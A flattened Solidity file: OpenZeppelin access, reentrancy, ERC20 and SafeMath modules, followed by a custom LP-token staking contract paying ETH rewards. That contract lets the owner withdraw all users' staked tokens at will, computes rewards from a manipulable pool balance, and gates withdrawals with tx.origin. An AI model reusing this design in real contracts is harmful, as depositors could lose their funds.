// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v4.9.0) (access/Ownable.sol)

pragma solidity ^0.8.0;

import "../utils/Context.sol";

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if the sender is not the owner.
     */
    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby disabling any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}
// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v4.9.0) (security/ReentrancyGuard.sol)

pragma solidity ^0.8.0;

/**
 * @dev Contract module that helps prevent reentrant calls to a function.
 *
 * Inheriting from `ReentrancyGuard` will make the {nonReentrant} modifier
 * available, which can be applied to functions to make sure there are no nested
 * (reentrant) calls to them.
 *
 * Note that because there is a single `nonReentrant` guard, functions marked as
 * `nonReentrant` may not call one another. This can be worked around by making
 * those functions `private`, and then adding `external` `nonReentrant` entry
 * points to them.
 *
 * TIP: If you would like to learn more about reentrancy and alternative ways
 * to protect against it, check out our blog post
 * https://blog.openzeppelin.com/reentrancy-after-istanbul/[Reentrancy After Istanbul].
 */
abstract contract ReentrancyGuard {
    // Booleans are more expensive than uint256 or any type that takes up a full
    // word because each write operation emits an extra SLOAD to first read the
    // slot's contents, replace the bits taken up by the boolean, and then write
    // back. This is the compiler's defense against contract upgrades and
    // pointer aliasing, and it cannot be disabled.

    // The values being non-zero value makes deployment a bit more expensive,
    // but in exchange the refund on every call to nonReentrant will be lower in
    // amount. Since refunds are capped to a percentage of the total
    // transaction's gas, it is best to keep them low in cases like this one, to
    // increase the likelihood of the full refund coming into effect.
    uint256 private constant _NOT_ENTERED = 1;
    uint256 private constant _ENTERED = 2;

    uint256 private _status;

    constructor() {
        _status = _NOT_ENTERED;
    }

    /**
     * @dev Prevents a contract from calling itself, directly or indirectly.
     * Calling a `nonReentrant` function from another `nonReentrant`
     * function is not supported. It is possible to prevent this from happening
     * by making the `nonReentrant` function external, and making it call a
     * `private` function that does the actual work.
     */
    modifier nonReentrant() {
        _nonReentrantBefore();
        _;
        _nonReentrantAfter();
    }

    function _nonReentrantBefore() private {
        // On the first call to nonReentrant, _status will be _NOT_ENTERED
        require(_status != _ENTERED, "ReentrancyGuard: reentrant call");

        // Any calls to nonReentrant after this point will fail
        _status = _ENTERED;
    }

    function _nonReentrantAfter() private {
        // By storing the original value once again, a refund is triggered (see
        // https://eips.ethereum.org/EIPS/eip-2200)
        _status = _NOT_ENTERED;
    }

    /**
     * @dev Returns true if the reentrancy guard is currently set to "entered", which indicates there is a
     * `nonReentrant` function in the call stack.
     */
    function _reentrancyGuardEntered() internal view returns (bool) {
        return _status == _ENTERED;
    }
}
// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v4.9.0) (token/ERC20/IERC20.sol)

pragma solidity ^0.8.0;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `from` to `to` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}
// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.1 (utils/Context.sol)

pragma solidity ^0.8.0;

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}
// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v4.9.0) (utils/math/SafeMath.sol)

pragma solidity ^0.8.0;

// CAUTION
// This version of SafeMath should only be used with Solidity 0.8 or later,
// because it relies on the compiler's built in overflow checks.

/**
 * @dev Wrappers over Solidity's arithmetic operations.
 *
 * NOTE: `SafeMath` is generally not needed starting with Solidity 0.8, since the compiler
 * now has built in overflow checking.
 */
library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
            // benefit is lost if 'b' is also tested.
            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    /**
     * @dev Returns the division of two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator.
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {trySub}.
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting with custom message when dividing by zero.
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {tryMod}.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}
//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// A new paradigm. 

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/math/SafeMath.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract LinqBasicLpStaking is Ownable, ReentrancyGuard {
    
    using SafeMath for uint256;

    IERC20 public lpToken;
    uint256 public lockPeriod = 20160 minutes;  // 20160 minutes
    uint256 public lock_var = 20160; // 14
    uint256 public rewardPerBlock = 1e18;
    uint256 public blockPerMinutes = 4;  // 4
    uint256 public AverageBlockTime = 13; // 13
    bool public EmergencyFeeWaive = false;
    bool public Deposit_enabled = false; // false 

    struct Stake {
        uint256 stakedAmount;
        uint256 stakeTime;
        uint256 unstakeTime;
        uint256 startBlock;
        uint256 lastClaimedBlock;
        uint256 claimedRewards;
    }

    struct UserInfo {
        Stake[] stakes;
    }

    mapping(address => UserInfo) private userInfo;

    event Staked(address indexed user, uint256 amount,uint256 startTime, uint256 endTime);
    event RewardWithdrawn(address indexed user, uint256 reward);
    event Unstaked(address indexed user, uint256 reward,uint256 unstakeAmount );

    constructor(IERC20 _rewardToken) {
        lpToken = _rewardToken;
    }

    function SetAverageBlockTimeAndTimeVar(uint256 _newTime, uint256 _time) external onlyOwner {
        AverageBlockTime = _newTime;
        lock_var = _time;
    }
    function enableDeposits(bool state) public onlyOwner {
        Deposit_enabled = state;
    }

    function stake(uint256 _tokenAmount) external nonReentrant {
        require(Deposit_enabled == true, "Deposits need to be enabled");
        require(_tokenAmount > 0, "Staking amount must be greater than 0!");

        uint256 _stakeTime = block.timestamp;
        uint256 _unstakeTime = _stakeTime.add(lockPeriod);

        userInfo[msg.sender].stakes.push(Stake({
            stakedAmount: _tokenAmount,
            stakeTime: _stakeTime,
            unstakeTime : _unstakeTime,
            startBlock : block.number,
            lastClaimedBlock: block.number,
            claimedRewards: 0
        }));
        require(lpToken.transferFrom(msg.sender, address(this), _tokenAmount), "Token transfer failed!");

        emit Staked(msg.sender, _tokenAmount, _stakeTime, _unstakeTime);
    }

    function unstake() external {
        UserInfo storage user = userInfo[msg.sender];

        uint256 totalUnstakeAmount = 0;
        uint256 totalReward = 0;

        // Store indexes of stakes that need to be removed
        uint256[] memory toRemoveIndexes = new uint256[](user.stakes.length);
        uint256 removeCount = 0;

        for (uint256 i = 0; i < user.stakes.length; i++) {
            if (block.timestamp >= user.stakes[i].stakeTime.add(lockPeriod)) {
                uint256 stakeReward = calculateRewardForStake(msg.sender, i);
                totalReward = totalReward.add(stakeReward);
                totalUnstakeAmount = totalUnstakeAmount.add(user.stakes[i].stakedAmount);

                if (stakeReward > 0 && !EmergencyFeeWaive) {
                    withdrawReward();
                }
                toRemoveIndexes[removeCount] = i;
                removeCount++;
            }
        }

        require(removeCount > 0, "Lock time not completed yet.");

        for (uint256 j = removeCount; j > 0; j--) {
            if (toRemoveIndexes[j - 1] != user.stakes.length - 1) {
                user.stakes[toRemoveIndexes[j - 1]] = user.stakes[user.stakes.length - 1];
            }
            user.stakes.pop();
        }

        require(lpToken.transfer(msg.sender, totalUnstakeAmount), "Failed to transfer LP tokens.");

        emit Unstaked(msg.sender, totalReward, totalUnstakeAmount);
    }

    function calculatePercentage(address user) public view returns(uint256) {
        UserInfo storage userInformation = userInfo[user];
        uint256 userTotalStake = 0;
        for (uint256 i = 0; i < userInformation.stakes.length; i++) {
            userTotalStake = userTotalStake.add(userInformation.stakes[i].stakedAmount);
        }

        uint256 totalPoolBalance = lpToken.balanceOf(address(this));
        if (totalPoolBalance == 0) {
            return 0;
        }

        uint256 percentage = userTotalStake.mul(10000).div(totalPoolBalance); 
        return percentage;
    }
 
    function getUserRewardForBlock(address user) public view returns (uint256) {
        uint256 userPercentage = calculatePercentage(user);
        uint256 userReward = rewardPerBlock.mul(userPercentage).div(10000); 
        return userReward;
    }

    function withdrawReward() public  {
        require(msg.sender == tx.origin, "invalid caller!");
        UserInfo storage user = userInfo[msg.sender];
        uint256 totalRewards = 0;

        for (uint256 i = 0; i < user.stakes.length; i++) {
            Stake storage stakeInfo = user.stakes[i];
            uint256 reward = calculateRewardForStake(msg.sender, i); 
            
            totalRewards = totalRewards.add(reward);

            if (reward > 0) {
            stakeInfo.lastClaimedBlock = block.number;
            stakeInfo.claimedRewards = stakeInfo.claimedRewards.add(reward);
            }
        }

        require(totalRewards > 0, "No rewards to withdraw");
        require(address(this).balance >= totalRewards, "insufficient ETH Balance!");
        payable(msg.sender).transfer(totalRewards);

        emit RewardWithdrawn(msg.sender, totalRewards);
    }

    function calculateRewardForStake(address user, uint256 stakeIndex) public view returns (uint256) {
        Stake storage stakeInfo = userInfo[user].stakes[stakeIndex];

        uint256 endBlock = stakeInfo.startBlock.add(blockPerMinutes.mul(lock_var));
        uint256 blockToCalculateUntil = (block.number < endBlock) ? block.number : endBlock;

        if (stakeInfo.lastClaimedBlock >= blockToCalculateUntil) {
            return 0;
        }

        uint256 blocksSinceLastClaim = blockToCalculateUntil.sub(stakeInfo.lastClaimedBlock);
        return getUserRewardForBlock(user).mul(blocksSinceLastClaim);
    }

    function calculateRewardSinceLastClaim(address user) public view returns (uint256) {
        uint256 totalReward = 0;
        for (uint256 i = 0; i < userInfo[user].stakes.length; i++) {
            totalReward = totalReward.add(calculateRewardForStake(user, i));
        }
        return totalReward;
    }

    function checkRemainingTimeAndBlocks(address user) public view returns(uint256[] memory remainingTimes, uint256[] memory remainingBlocks){
        UserInfo storage userInformation = userInfo[user];
        
        uint256[] memory _remainingTimes = new uint256[](userInformation.stakes.length);
        uint256[] memory _remainingBlocks = new uint256[](userInformation.stakes.length);

        for(uint256 i = 0; i < userInformation.stakes.length; i++) {
            Stake storage stakeInfo = userInformation.stakes[i];
            
            uint256 endBlock = stakeInfo.startBlock.add(blockPerMinutes.mul(lock_var));
            _remainingBlocks[i] = (block.number >= endBlock) ? 0 : endBlock.sub(block.number);
            _remainingTimes[i] = _remainingBlocks[i].mul(AverageBlockTime); // Assuming an average block time of 13 seconds for Ethereum // was 3 
            
            if(block.timestamp >= stakeInfo.unstakeTime) {
                _remainingTimes[i] = 0; 
            }
        }
        return (_remainingTimes, _remainingBlocks);
    }

    function checkRemainingTime(address user) external view returns(uint256[] memory){
        UserInfo storage userInformation = userInfo[user];
        uint256[] memory remainingTimes = new uint256[](userInformation.stakes.length);

        for(uint256 i = 0; i < userInformation.stakes.length; i++) {
            Stake storage stakeInfo = userInformation.stakes[i];
            if(block.timestamp < stakeInfo.unstakeTime) {
                remainingTimes[i] = stakeInfo.unstakeTime.sub(block.timestamp);
            } else {
                remainingTimes[i] = 0; 
            }
        }
        return remainingTimes;
    }

    function getAllStakeDetails(address _user) external view returns (uint256[] memory stakeIndices, Stake[] memory stakes) {
        UserInfo storage user = userInfo[_user];
        stakeIndices = new uint256[](user.stakes.length);
        stakes = user.stakes;

        for (uint256 i = 0; i < user.stakes.length; i++) {
            stakeIndices[i] = i;
        }

        return (stakeIndices, stakes);
    }

    function getCurrentBlock() public view returns(uint256) {
        return block.number;
    }



    function getLpDepositsForUser(address account)
        public
        view
        returns (uint256)
    {
        UserInfo storage user = userInfo[account];
        uint256 totalStaked; // Initialize the total staked variable

        for (uint256 i = 0; i < user.stakes.length; i++) {
            totalStaked += user.stakes[i].stakedAmount; // Accumulate the staked amounts
        }

        return totalStaked;
    }

    function EmergencyMeasures(bool state) public onlyOwner {
        EmergencyFeeWaive = state;
    }

    function updateRewards(uint256 _rewardperBlock) external onlyOwner {
        rewardPerBlock = _rewardperBlock;
    }

    function updatelockPeriod(uint256 newLockPeriodInMinutes)
        external
        onlyOwner
    {
        lockPeriod = newLockPeriodInMinutes * 1 minutes;
    }
    function updateBlockPerMinutes(uint256 _blockPerMinute) external onlyOwner  {
    blockPerMinutes=_blockPerMinute;

    }
    function emergencyWithdrawLpTokens() external onlyOwner {
        uint256 balanceOfContract = lpToken.balanceOf(address(this));
        lpToken.transfer(owner(), balanceOfContract);
    }

    function CheckBalance() public view returns(uint256){
        return lpToken.balanceOf(address(this));
    }

    function withdrawETH() external onlyOwner {
        payable (owner()).transfer(address(this).balance);
    }
    receive() external payable {}
}